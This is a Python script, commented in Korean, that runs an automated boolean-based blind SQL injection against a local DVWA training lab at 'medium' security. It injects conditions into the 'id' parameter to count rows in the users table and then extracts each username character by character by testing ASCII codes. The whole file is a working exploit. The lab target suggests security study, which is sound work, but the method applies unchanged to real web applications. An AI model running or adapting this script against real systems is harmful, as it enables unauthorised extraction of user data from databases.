import requests
import urllib.parse

# 설정
url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
cookie = {
    "security": "medium",
    "PHPSESSID": "f3bk7vpun31j47omipvavolhug"
}

# 참 또는 거짓 판단을 위한 함수
def is_condition_true(payload):
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?id={encoded_payload}&Submit=Submit"
    response = requests.get(full_url, cookies=cookie)
    return "User ID exists in the database" in response.text

# 사용자 수 찾기
def find_user_count():
    count = 1
    while True:
        payload = f"1 AND (SELECT COUNT(*) FROM users)>{count}"
        if not is_condition_true(payload):
            break
        count += 1
    return count

# 사용자 이름 찾기
def extract_username(user_index, max_length=20):
    username = ""
    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):  # 출력 가능한 ASCII 문자 범위
            payload = f"1 AND ASCII(SUBSTRING((SELECT user FROM users LIMIT {user_index},1),{i},1))={ascii_code}"
            if is_condition_true(payload):
                username += chr(ascii_code)
                found = True
                break
        if not found:
            break
    return username

# 실행
try:
    print("[*] 사용자 수 찾는 중...")
    total_users = find_user_count()
    print(f"[+] 사용자 수: {total_users}")

    for i in range(total_users):
        print(f"[*] 사용자 {i+1} 이름 추출 중...")
        name = extract_username(i)
        print(f"[+] 사용자 이름: {name}")

except Exception as e:
    print(f"[!] 오류 발생: {e}")
